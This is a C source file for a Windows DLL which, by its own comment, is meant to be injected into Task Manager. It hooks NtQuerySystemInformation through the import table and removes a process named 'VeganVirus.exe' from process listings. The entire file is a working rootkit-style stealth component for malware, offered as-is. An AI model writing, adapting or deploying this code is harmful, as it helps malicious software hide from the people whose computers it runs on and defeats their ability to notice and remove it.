#define WIN32_LEAN_AND_MEAN 
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>

#define PROCESS_TO_HIDE L"VeganVirus.exe"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;
typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

PNT_QUERY_SYSTEM_INFORMATION originalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)&NtQuerySystemInformation;

// hooked function calls original function and drops specific process from list of processes.
NTSTATUS WINAPI hookedNtQuerySystemInformation(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
)
{
    // call original function
    NTSTATUS status = originalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );

    if (SystemProcessInformation != SystemInformationClass || status != STATUS_SUCCESS)
        return status;  // something went wrong

    // go over processes and delete process (like linked list)
    PMY_SYSTEM_PROCESS_INFORMATION pCurrent = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
    while (pCurrent->NextEntryOffset != 0)
    {
        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
        if (!wcsncmp(pNext->ImageName.Buffer, PROCESS_TO_HIDE, pNext->ImageName.Length))
        {
            // skip over
            if (!pNext->NextEntryOffset) // deleted process is last
                pCurrent->NextEntryOffset = 0;  // set current as last instead
            else
                pCurrent->NextEntryOffset += pNext->NextEntryOffset;    // set current->next to next->next
        }
        else
            pCurrent = pNext;
    }

    return status;
}

// function hooks NtQuerySystemInformation from ntdll.dll
// Changes address to hooked function inside Import Directory of PE
void startHook()
{
    // get current module's information
    MODULEINFO moduleInfo = { 0 };
    HMODULE moduleHandle = GetModuleHandle(0);

    GetModuleInformation(GetCurrentProcess(), moduleHandle, &moduleInfo, sizeof(MODULEINFO));

    // base address of module
    LPBYTE moduleAddress = (LPBYTE)moduleInfo.lpBaseOfDll;

    // DOS headers -> NT headers -> Optional headers -> Import Directory
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)moduleAddress;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(moduleAddress + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeaders->OptionalHeader;
    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(moduleAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // find ntdll in import directory
    for (; pImportDescriptor->Characteristics; pImportDescriptor++)
    {
        if (!strcmp("ntdll.dll", (char*)(moduleAddress + pImportDescriptor->Name)))
            break;  // found ntdll
    }

    // go over ILT (Import Lookup Table) and find the function to hook
    PIMAGE_THUNK_DATA pILT = (PIMAGE_THUNK_DATA)(moduleAddress + pImportDescriptor->OriginalFirstThunk);
    PIMAGE_THUNK_DATA pILT2 = (PIMAGE_THUNK_DATA)(moduleAddress + pImportDescriptor->FirstThunk);
    // check if function is referenced by a name (and not by an ordinal value)
    for (; !(pILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pILT->u1.AddressOfData; pILT++)
    {
        PIMAGE_IMPORT_BY_NAME pImportEntry = (PIMAGE_IMPORT_BY_NAME)(moduleAddress + pILT->u1.AddressOfData);
        if (!strcmp("NtQuerySystemInformation", (char*)pImportEntry->Name))
            break;  // found API import
        pILT2++;
    }

    // change to readwrite permissions and replace import address to hooked function
    DWORD oldProtect = NULL, changedProtect = NULL;
    VirtualProtect((LPVOID) & (pILT2->u1.Function), sizeof(DWORD), PAGE_READWRITE, &oldProtect);

    pILT2->u1.Function = (DWORD)hookedNtQuerySystemInformation;

    // return old permissions
    VirtualProtect((LPVOID) & (pILT2->u1.Function), sizeof(DWORD), oldProtect, &changedProtect);

    CloseHandle(moduleHandle);
}

/*
DLL to be injected into task manager.
API Hook of NtQuerySystemInformation for hiding process
*/
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        startHook();
        break;
    }
    return TRUE;
}
